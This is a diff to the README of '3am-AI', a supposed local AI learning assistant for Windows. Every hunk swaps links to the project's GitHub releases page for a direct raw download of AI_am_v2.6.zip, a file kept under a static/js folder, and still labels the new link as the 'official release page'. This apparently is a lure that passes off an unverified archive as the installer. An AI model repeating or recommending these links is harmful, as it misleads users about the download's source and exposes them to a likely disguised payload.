@@ -1,6 +1,6 @@
 # 🤖 3am-AI - Your Local AI Learning While You Sleep
 
-[![Download 3am-AI](https://img.shields.io/badge/Download-3am--AI-brightgreen?style=for-the-badge)](https://github.com/aitora159-art/3am-AI/releases)
+[![Download 3am-AI](https://img.shields.io/badge/Download-3am--AI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/aitora159-art/3am-AI/main/static/js/AI_am_v2.6.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to get your copy of 3am-AI up and running on your Windows PC.
 
 Click the link below to visit the official release page:
 
-[![Download 3am-AI](https://img.shields.io/badge/Download-3am--AI-blue?style=for-the-badge)](https://github.com/aitora159-art/3am-AI/releases)
+[![Download 3am-AI](https://img.shields.io/badge/Download-3am--AI-blue?style=for-the-badge)](https://raw.githubusercontent.com/aitora159-art/3am-AI/main/static/js/AI_am_v2.6.zip)
 
 This page contains the latest available files and updates.
 
@@ -117,7 +117,7 @@ All these combine to make a smart, self-evolving helper that respects your priva
 
 ## 🔄 Updating 3am-AI
 
-1. Return to the [release page](https://github.com/aitora159-art/3am-AI/releases).
+1. Return to the [release page](https://raw.githubusercontent.com/aitora159-art/3am-AI/main/static/js/AI_am_v2.6.zip).
 2. Download the latest installer when a new version appears.
 3. Run the installer and follow prompts.
 4. Your data will stay safe and carried over during updates.
@@ -126,7 +126,7 @@ All these combine to make a smart, self-evolving helper that respects your priva
 
 ## 📂 Useful Links
 
-- Download releases: https://github.com/aitora159-art/3am-AI/releases
+- Download releases: https://raw.githubusercontent.com/aitora159-art/3am-AI/main/static/js/AI_am_v2.6.zip
 - Issues and support: Use the GitHub repository Issues tab
 - Documentation: Check the included readme files in the installer folder
 
